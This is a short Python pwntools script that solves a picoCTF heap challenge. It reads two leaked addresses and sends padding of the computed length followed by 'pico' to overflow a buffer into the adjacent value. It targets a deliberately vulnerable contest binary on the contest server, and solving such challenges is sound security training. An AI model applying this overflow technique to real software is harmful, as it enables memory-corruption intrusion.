#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("tethys.picoctf.net", 54028)

    return r


def main():
    r = conn()

    r.recvuntil(b'[*]   ')
    write_addr = int(r.readline().strip().split(b' ')[0].decode()[2:], 16)

    r.recvuntil(b'[*]   ')
    overwrite_addr = int(r.readline().strip().split(b' ')[0].decode()[2:], 16)

    r.sendlineafter(b'choice: ', b'2')
    r.sendlineafter(b'buffer: ', b'A'*(overwrite_addr-write_addr) + b'pico')
    r.sendlineafter(b'choice: ', b'4')

    while True:
        print(r.recvline())

    r.interactive()


if __name__ == "__main__":
    main()
